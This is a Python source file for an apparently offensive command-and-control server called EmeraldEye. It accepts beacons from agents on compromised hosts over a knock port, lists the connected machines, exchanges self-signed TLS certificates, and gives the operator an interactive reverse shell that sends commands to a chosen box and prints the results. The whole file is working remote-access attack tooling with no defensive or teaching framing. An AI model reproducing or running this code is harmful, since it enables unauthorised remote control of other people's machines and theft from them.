import socket
import threading
from OpenSSL import crypto
import ssl
import time

KNOCK_PORT = 31415
TLS_PORT = 31416

#HOST = "0.0.0.0"
HOST = "127.0.0.1"

class EmeraldEyeServer():

    def __init__(self, host):
        self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        self.sock.bind((host, TLS_PORT))
        self.sock.listen(15)
        self.knock_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.knock_sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        self.host = host
        self.knock_sock.bind((host, KNOCK_PORT))
        self.ping_threads = {}
        self.ping_master = threading.Thread(target=self.listen, args=()).start()
        self.tls_private_key_file = "server.key"
        self.tls_cert_file = "server.crt"
        self.tls_other_crt_file = "client.crt"
        self.server_hostname = 'emeraldeye.io'
        self.my_crt = self.cert_gen()
        

    def cert_gen(self, validityEndInSeconds=10*365*24*60*60):
        k = crypto.PKey()
        k.generate_key(crypto.TYPE_RSA, 2048)
        cert = crypto.X509()
        cert.get_subject().CN = "emeraldeye.io"
        cert.gmtime_adj_notBefore(0)
        cert.gmtime_adj_notAfter(validityEndInSeconds)
        cert.set_issuer(cert.get_subject())
        cert.set_pubkey(k)
        cert.sign(k, 'sha512')
        ret = crypto.dump_certificate(crypto.FILETYPE_PEM, cert)
        with open(self.tls_cert_file, "wt") as f:
            f.write(ret.decode("utf-8"))
        with open(self.tls_private_key_file, "wt") as f:
            f.write(crypto.dump_privatekey(crypto.FILETYPE_PEM, k).decode("utf-8"))
        return ret
    

    def listen(self):
        self.knock_sock.listen(5)
        while True:
            con, addy = self.knock_sock.accept()
            con.settimeout(10)
            self.ping_threads[addy] = con
            threading.Thread(target=self.handle_health, args=(con, addy)).start()
            
    
    def handle_health(self, con, addy):
        while True:
            try:
                temp = con.recv(1024).decode()
                if temp == b'Knock':
                    con.send(b'Knock')
            except Exception as e:
                if addy in self.ping_threads:
                    del self.ping_threads[addy]
                
            
    
    def send_start(self, addy):
        crt = b''
        con = self.ping_threads[addy]
        while crt == b'':
            try:
                con.sendall(b'crt-'+self.my_crt)
                print("Cert Sent")
                con.settimeout(5)
                print("Waiting...")
                crt = con.recv(1024)
                con.sendall(b'go')
                print("Sent Start")
                crt = crt.split(b'crt-')[1]
                with open(self.tls_other_crt_file, "wt") as f:
                    f.write(crt.decode("utf-8"))
            except Exception as e:
                print(e)
                print("Didn't get TLS certs, retrying")
                break
        
        

    def handle_agent(self):
        context = ssl.create_default_context(ssl.Purpose.CLIENT_AUTH, cafile=self.tls_other_crt_file)
        context.verify_mode = ssl.CERT_REQUIRED
        context.load_cert_chain(certfile=self.tls_cert_file, keyfile=self.tls_private_key_file)
        new_sock, addy = self.sock.accept()
        con = context.wrap_socket(new_sock, server_side=True)
        buff = ""
        while "-emrdeye" not in buff:
            try:
                temp = con.recv(1024).decode()
                buff +=  temp               
            except Exception as e:
                temp = ""
        buff = buff.split("-emrdeye")[0]
        print(buff, end="")
        while True:
            command = input("")
            if command == "exit":
                break
            command += "\n"
            con.send(command.encode())
            count = 0
            while True:
                try:
                    buff = ""
                    while "-emrdeye" not in buff:
                        try:
                            con.settimeout(0.2)
                            tmp = con.recv(1024).decode()
                            buff += tmp           
                        except Exception as e:
                            raise e
                    buff = buff.split("-emrdeye")[0]
                    if buff.strip():
                        if count != 0:
                            print(buff, end="")
                        count += 1
                except Exception as e:
                    break
        con.close()

def main():
    t = EmeraldEyeServer(HOST)
    while True:
        print("Please enter selection:")
        print("List Connected Machines - <Enter>")
        print("Reverse Shell - 1")
        select = input(">>>>>>>>>>> Emerald Eye >>>>>>>>>>")
        c = 0
        keys = []
        for s in t.ping_threads.keys():
            print(str(c) + ". " + str(s))
            keys.append(s)
            c += 1
        print("\n\n\n")
        if select == "1":
            if len(t.ping_threads) > 0:
                num = input("Number of box you want to connect to:")
                addy = keys[int(num)]
                time.sleep(0.025)
                t.send_start(addy)
                t.handle_agent()
            else:
                print("No connected machines please wait")
        keys = []
if __name__ == "__main__":
    main()